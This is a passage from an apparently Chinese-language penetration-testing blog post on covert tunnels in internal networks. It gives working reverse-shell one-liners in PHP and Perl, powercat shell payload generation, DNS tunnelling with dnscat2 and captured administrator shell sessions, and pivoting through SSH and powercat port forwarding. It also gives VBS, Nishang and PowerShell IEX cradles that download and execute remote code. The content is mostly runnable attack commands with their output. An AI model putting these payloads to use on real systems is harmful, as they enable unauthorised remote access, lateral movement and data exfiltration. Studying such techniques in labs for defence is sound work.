+<h4 id="03-PHP反弹shell"><a href="#03-PHP反弹shell" class="headerlink" title="03.PHP反弹shell"></a>03.PHP反弹shell</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.1.11&quot;,6666);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="04-Perl反弹shell"><a href="#04-Perl反弹shell" class="headerlink" title="04.Perl反弹shell"></a>04.Perl反弹shell</h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.1.11&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-powercat"><a href="#4-powercat" class="headerlink" title="4.powercat"></a>4.powercat</h3><p><code>Powershell版nc</code></p>
+<p><code>参数</code></p>
+<table>
+<thead>
+<tr>
+<th><strong>参数</strong></th>
+<th><strong>功能</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-l</td>
+<td>监听入站连接</td>
+</tr>
+<tr>
+<td>-c</td>
+<td>连接目标</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>连接或监听的端口</td>
+</tr>
+<tr>
+<td>-e</td>
+<td>返回某个程序</td>
+</tr>
+<tr>
+<td>-ep</td>
+<td>返回PowerShel</td>
+</tr>
+<tr>
+<td>-r</td>
+<td>端口转发</td>
+</tr>
+<tr>
+<td>-u</td>
+<td>通过UDP隧道传输数据</td>
+</tr>
+<tr>
+<td>-dns</td>
+<td>通过DNS隧道传输数据</td>
+</tr>
+<tr>
+<td>-dnsft</td>
+<td>DNS失效阈值</td>
+</tr>
+<tr>
+<td>-t</td>
+<td>超时选项。默认值：60</td>
+</tr>
+<tr>
+<td>-i</td>
+<td>输入：文件路径（字符串）、字节数组或字符串</td>
+</tr>
+<tr>
+<td>-o</td>
+<td>控制台输出类型：“主机”、“字节”或“字符串”</td>
+</tr>
+<tr>
+<td>-of</td>
+<td>输出文件路径</td>
+</tr>
+<tr>
+<td>-d</td>
+<td>连接后断开</td>
+</tr>
+<tr>
+<td>-rep</td>
+<td>重新启动</td>
+</tr>
+<tr>
+<td>-g</td>
+<td>生成有效载荷</td>
+</tr>
+<tr>
+<td>-ge</td>
+<td>生成编码后的有效载荷</td>
+</tr>
+<tr>
+<td>-h</td>
+<td>帮助信息</td>
+</tr>
+</tbody></table>
+<h4 id="01-Powercat生成payload"><a href="#01-Powercat生成payload" class="headerlink" title="01.Powercat生成payload"></a>01.Powercat生成payload</h4><h5 id="1-正向shell"><a href="#1-正向shell" class="headerlink" title="1.正向shell"></a>1.正向shell</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powercat -l -p 6666 -e cmd -v -g &gt;&gt; shell.ps1</span><br></pre></td></tr></table></figure>
+
+<p><code>连接</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powercat -c 10.10.10.10 -p 6666 -v</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-反向shell"><a href="#2-反向shell" class="headerlink" title="2.反向shell"></a>2.反向shell</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powercat -c 10.10.10.10 -p 6666 -e cmd -v -g &gt;&gt; demo.ps1</span><br></pre></td></tr></table></figure>
+
+<p><code>连接</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powercat -l -p 6666 -v</span><br></pre></td></tr></table></figure>
+
+<h4 id="02-powercat-DNS隧道"><a href="#02-powercat-DNS隧道" class="headerlink" title="02.powercat DNS隧道"></a>02.powercat DNS隧道</h4><p><code>powercat DNS隧道是基于dnscat设计的，首先安装dnscat</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure>
+
+<p><code>kali执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure>
+
+<p><code>目标主机执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powercat -c 192.168.1.7 -p 53 -dns ttpowercat.test -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><code>得到shell</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> New window created: 1</span></span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line"></span><br><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> session -i 1</span></span><br><span class="line">New window created: 1</span><br><span class="line">history_size (session) =&gt; 1000</span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line">This is a console session!</span><br><span class="line"></span><br><span class="line">That means that anything you type will be sent as-is to the</span><br><span class="line">client, and anything they type will be displayed as-is on the</span><br><span class="line">screen! If the client is executing a command and you don&#x27;t</span><br><span class="line">see a prompt, try typing &#x27;pwd&#x27; or something!</span><br><span class="line"></span><br><span class="line">To go back, type ctrl-z.</span><br><span class="line"></span><br><span class="line">Microsoft Windows [???? 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation????????????????</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;</span><br><span class="line">unnamed 1&gt; </span><br><span class="line">unnamed 1&gt; </span><br><span class="line">C:\Users\Administrator&gt;whoami</span><br><span class="line">unnamed 1&gt; whoami</span><br><span class="line">jiye\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="03-powercat作为跳板机"><a href="#03-powercat作为跳板机" class="headerlink" title="03.powercat作为跳板机"></a>03.powercat作为跳板机</h4><blockquote>
+<p>环境简介：</p>
+<p>3台机器。server 2019 能与win7和kali互通，kali与win7不能互通，server 2019作为跳板机使kali与win7互通</p>
+</blockquote>
+<p><code>win7执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powercat -l -v -p 9999 -e cmd.exe    #本地监听9999端口</span><br></pre></td></tr></table></figure>
+
+<p><code>server 2019执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powercat -l -v -p 8888 -r tcp:10.10.10.20:9999    #本地监听8888端口并转发至10.10.10.20的9999端口</span><br></pre></td></tr></table></figure>
+
+<p><code>kali</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# nc 192.168.1.5 8888 -vv</span><br><span class="line">192.168.1.5: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) [192.168.1.5] 8888 (?) open</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">jiye\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">连接server 2019的8888端口就转发到了win7的9999端口</span></span><br></pre></td></tr></table></figure>
+
+<p><code>使用DNS协议，与tcp数据流正好相反</code></p>
+<p><code>server 2019</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powercat -l -p 9999 -r dns:192.168.1.7::ttpowercat.test</span><br></pre></td></tr></table></figure>
+
+<p><code>kali</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure>
+
+<p><code>win7</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powercat -c 10.10.10.10 -p 9999 -v -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><code>kali得到shell</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> New window created: 1</span></span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line"></span><br><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> session -i 1</span></span><br><span class="line">New window created: 1</span><br><span class="line">history_size (session) =&gt; 1000</span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line">This is a console session!</span><br><span class="line"></span><br><span class="line">That means that anything you type will be sent as-is to the</span><br><span class="line">client, and anything they type will be displayed as-is on the</span><br><span class="line">screen! If the client is executing a command and you don&#x27;t</span><br><span class="line">see a prompt, try typing &#x27;pwd&#x27; or something!</span><br><span class="line"></span><br><span class="line">To go back, type ctrl-z.</span><br><span class="line"></span><br><span class="line">Microsoft Windows [???? 6.1.7601]</span><br><span class="line">???????? (c) 2009 Microsoft Corporation????????????????</span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;ipconfig</span><br><span class="line">unnamed 1&gt; ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP ????</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">???????????? ????????:</span><br><span class="line"></span><br><span class="line">   ?????????? DNS ???? . . . . . . . : </span><br><span class="line">   ???????? IPv6 ????. . . . . . . . : fe80::f161:9ab3:b020:30f1%11</span><br><span class="line">   IPv4 ???? . . . . . . . . . . . . : 10.10.10.20</span><br><span class="line">   ????????  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   ????????. . . . . . . . . . . . . : 10.10.10.2</span><br><span class="line"></span><br><span class="line">?????????? isatap.&#123;40BE814B-BB9A-4845-AADE-41A6B9E99107&#125;:</span><br><span class="line"></span><br><span class="line">   ????????  . . . . . . . . . . . . : ??????????</span><br><span class="line">   ?????????? DNS ???? . . . . . . . : </span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-应用层隧道"><a href="#0x04-应用层隧道" class="headerlink" title="0x04.应用层隧道"></a>0x04.应用层隧道</h2><h4 id="1-ssh协议"><a href="#1-ssh协议" class="headerlink" title="1.ssh协议"></a>1.ssh协议</h4><p><code>参数</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-C：压缩传输，提高传输速率。</span><br><span class="line">-f：将SSH传输转入后台执行，不占用当前的shell。</span><br><span class="line">-N：建立静默连接（看不到具体会话）。</span><br><span class="line">-g：允许远程主机连接本地用于转发的端口。</span><br><span class="line">-L：本地端口转发。</span><br><span class="line">-R：远程端口转发。</span><br><span class="line">-D：动态转发（SOCKS代理）。</span><br><span class="line">-P：指定SSH端口。</span><br></pre></td></tr></table></figure>
+
+<h5 id="01-本地端口转发"><a href="#01-本地端口转发" class="headerlink" title="01.本地端口转发"></a>01.本地端口转发</h5><blockquote>
+<p>测试环境：</p>
+<p>kali可以访问内网web服务器(cnetos 7)，不能访问数据库服务器(win7)，centos 7与win7可以相互访问</p>
+</blockquote>
+<p><code>web服务器为跳板，将win7的3389端口映射到kali的3309端口，访问kali的3309端口就可以访问win7d的3389</code></p>
+<p><code>kali执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -L 3309:10.10.10.20:3389 root@192.168.1.11</span><br><span class="line">ssh -CfNg -L 3309&lt;本地端口&gt;:10.10.10.20:3389&lt;目标主机&gt; root@192.168.1.11&lt;跳板机&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>登入</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3309</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210723170858890.png" class>
+
+<h5 id="02-远程端口转发"><a href="#02-远程端口转发" class="headerlink" title="02.远程端口转发"></a>02.远程端口转发</h5><blockquote>
+<p>测试环境：</p>
+<p>kali不可以访问内网所有机器，内网web服务器(centos 7)可以访问kali，内网数据库(win7)不可以访问kali，内网全通。</p>
+</blockquote>
+<p><code>web为跳板机，将kali的3319端口的流量转发到目标主机win7的3389端口，访问kali的3319端口就可以访问win7的3389端口</code></p>
+<p><code>web(centos 7执行)</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -R 3319:10.10.10.20:3389 root@192.168.1.7</span><br><span class="line">ssh -CfNg -R 3319&lt;远程主机kali端口&gt;:10.10.10.20:3389&lt;目标主机win7数据库&gt; root@192.168.1.7&lt;远程主机kali&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>登入</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3309</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210723172754616.png" class>
+
+<blockquote>
+<p>本地端口转发：</p>
+<p>在本地(客户机)监听一个端口，所有访问这个端口的数据都会通过ssh隧道转发到远端对应的端口</p>
+<p>远程端口转发：</p>
+<p>在远程主机上(服务器)监听一个端口，所有访问远程服务器指定端口的数据都会通过ssh隧道传输到本地对应的端口</p>
+</blockquote>
+<h4 id="2-HTTP-HTTPS协议"><a href="#2-HTTP-HTTPS协议" class="headerlink" title="2.HTTP/HTTPS协议"></a>2.HTTP/HTTPS协议</h4><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3Jn">reGeorg工具<i class="fa fa-external-link-alt"></i></span></p>
+<h4 id="3-DNS协议"><a href="#3-DNS协议" class="headerlink" title="3.DNS协议"></a>3.DNS协议</h4><p><code>此部分内容测试需要公网域名</code></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lhZ294ODYvZG5zY2F0Mg==">dnscat2<i class="fa fa-external-link-alt"></i></span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsMWV4L2lvZGluZQ==">iodine<i class="fa fa-external-link-alt"></i></span></p>
+<h2 id="0x05-socks代理"><a href="#0x05-socks代理" class="headerlink" title="0x05.socks代理"></a>0x05.socks代理</h2><p><code>此部分内容测试需要公网ip与内网环境</code></p>
+<h4 id="1-EarthWorm"><a href="#1-EarthWorm" class="headerlink" title="1.EarthWorm"></a>1.EarthWorm</h4><h4 id="2-ScoksCap64"><a href="#2-ScoksCap64" class="headerlink" title="2.ScoksCap64"></a>2.ScoksCap64</h4><h4 id="3-Proxychains"><a href="#3-Proxychains" class="headerlink" title="3.Proxychains"></a>3.Proxychains</h4><h2 id="0x06-压缩数据"><a href="#0x06-压缩数据" class="headerlink" title="0x06.压缩数据"></a>0x06.压缩数据</h2><blockquote>
+<p>渗透过程中常常要下载数据，这里有几种将数据进行压缩方便下载的技术</p>
+</blockquote>
+<h3 id="1-RAR"><a href="#1-RAR" class="headerlink" title="1.RAR"></a>1.RAR</h3><p><code>这里提取出winrar下的rar.exe，参数如下：</code></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-a</td>
+<td>添加要压缩的文件</td>
+</tr>
+<tr>
+<td>-k</td>
+<td>锁定压缩文件</td>
+</tr>
+<tr>
+<td>-s</td>
+<td>生成存档文件（提高压缩比）</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>指定压缩密码</td>
+</tr>
+<tr>
+<td>-r</td>
+<td>递归压缩，包括子目录</td>
+</tr>
+<tr>
+<td>-x</td>
+<td>指定要排除的文件</td>
+</tr>
+<tr>
+<td>-v</td>
+<td>分卷打包，大文件使用</td>
+</tr>
+<tr>
+<td>-ep</td>
+<td>从名称中排除路径</td>
+</tr>
+<tr>
+<td>-ep1</td>
+<td>从名称中排除基本目录</td>
+</tr>
+<tr>
+<td>-m0</td>
+<td>存储，添加到压缩文件时不压缩文件</td>
+</tr>
+<tr>
+<td>-m1</td>
+<td>最快</td>
+</tr>
+<tr>
+<td>-m2</td>
+<td>较快</td>
+</tr>
+<tr>
+<td>-m3</td>
+<td>标准</td>
+</tr>
+<tr>
+<td>-m4</td>
+<td>较好</td>
+</tr>
+<tr>
+<td>-m5</td>
+<td>最好</td>
+</tr>
+</tbody></table>
+<h3 id="2-7-zip"><a href="#2-7-zip" class="headerlink" title="2.7-zip"></a>2.7-zip</h3><blockquote>
+<p>这里提取7z.exe，参数如下</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-r</td>
+<td>递归压缩</td>
+</tr>
+<tr>
+<td>-o</td>
+<td>指定输出目录</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>指定密码</td>
+</tr>
+<tr>
+<td>-v</td>
+<td>分卷压缩</td>
+</tr>
+<tr>
+<td>a</td>
+<td>添加压缩文件</td>
+</tr>
+</tbody></table>
+<h2 id="0x07-上传下载"><a href="#0x07-上传下载" class="headerlink" title="0x07.上传下载"></a>0x07.上传下载</h2><blockquote>
+<p>对于不能上传shell，但是可以执行命令的windows服务器，可以进行上传和下载操作</p>
+</blockquote>
+<h3 id="1-ftp协议上传下载"><a href="#1-ftp协议上传下载" class="headerlink" title="1.ftp协议上传下载"></a>1.ftp协议上传下载</h3><p><code>常用命令</code></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>open &lt;服务器地址&gt;</td>
+<td>链接服务器</td>
+</tr>
+<tr>
+<td>cd &lt;目录名&gt;</td>
+<td>进入指定目录</td>
+</tr>
+<tr>
+<td>lcd &lt;文件夹路径&gt;</td>
+<td>定位本地文件夹（上传文件的位置或者下载文件的本地位置）</td>
+</tr>
+<tr>
+<td>type</td>
+<td>查看当前的传输方式</td>
+</tr>
+<tr>
+<td>ascii</td>
+<td>设置传输方式为ascii码（TXT文件等）</td>
+</tr>
+<tr>
+<td>binary</td>
+<td>设置传输方式为二进制传输（EXE文件，图片，视频）</td>
+</tr>
+<tr>
+<td>close</td>
+<td>结束与ftp服务器的会话</td>
+</tr>
+<tr>
+<td>quit</td>
+<td>结束与ftp服务器的会话并退出ftp环境</td>
+</tr>
+<tr>
+<td>put &lt;文件名&gt; [新的文件名]</td>
+<td>上传，[]内容不指定则不修改</td>
+</tr>
+<tr>
+<td>send &lt;文件名&gt; [新的文件名]</td>
+<td>上传，[]内容不指定则不修改</td>
+</tr>
+<tr>
+<td>get &lt;文件名&gt; [新的文件名]</td>
+<td>下载，[]内容不指定则不修改</td>
+</tr>
+<tr>
+<td>mget &lt;文件名&gt; [文件名…]</td>
+<td>下载多个文件，支持空格和?通配符，如下载所有MP3文件：mget .mp3</td>
+</tr>
+</tbody></table>
+<h3 id="2-vbs上传"><a href="#2-vbs上传" class="headerlink" title="2.vbs上传"></a>2.vbs上传</h3><blockquote>
+<p>利用vbs上传主要使用msxm12.xmlhttp和adobd.stream对象，download.vbs文件：</p>
+<p>使用echo 内容 &gt;&gt; download.vbs逐行写入后执行</p>
+<p>Cscript download.vbs</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set Post = CreateObject(&quot;Msxm12.XMLHTTP&quot;)</span><br><span class="line">Set Shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">Post.Open &quot;GET&quot;,&quot;http://server_ip/target.exe&quot;,0</span><br><span class="line">Post.Send()</span><br><span class="line">Set aGet = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile &quot;C:\Test\target.exe&quot;,2</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-Nishang上传"><a href="#3-Nishang上传" class="headerlink" title="3.Nishang上传"></a>3.Nishang上传</h3><blockquote>
+<p>Nishang将上传的EXE文件转换为十六进制的形式然后用echo访问目标服务器最后使用Download_Execute脚本下载。<br>先利用Nishang中的exetotext.ps1脚本将Metasploit生成的msf.exe修改问msf.txt：</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\ ExetoText c\:msf.exe c:\msf.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>接着通过echo将hex值添加到目标文件中，调用Download_Execute：</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Download_Execute http://server_ip/target.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Debug上传"><a href="#4-Debug上传" class="headerlink" title="4.Debug上传"></a>4.Debug上传</h3><h3 id="5-bitsadmin下载"><a href="#5-bitsadmin下载" class="headerlink" title="5.bitsadmin下载"></a>5.bitsadmin下载</h3><blockquote>
+<p>bitsadmin不支持HTTPS和FTP，且在Windows XP/Server 2003及以前的版本无法使用，Windows7/8/10自带。</p>
+</blockquote>
+<h3 id="6-PowerShell下载"><a href="#6-PowerShell下载" class="headerlink" title="6.PowerShell下载"></a>6.PowerShell下载</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powershell IEX(New-Object System.Net.Webclient).DownloadString(&#x27;https://server_ip/target.exe&#x27;);</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
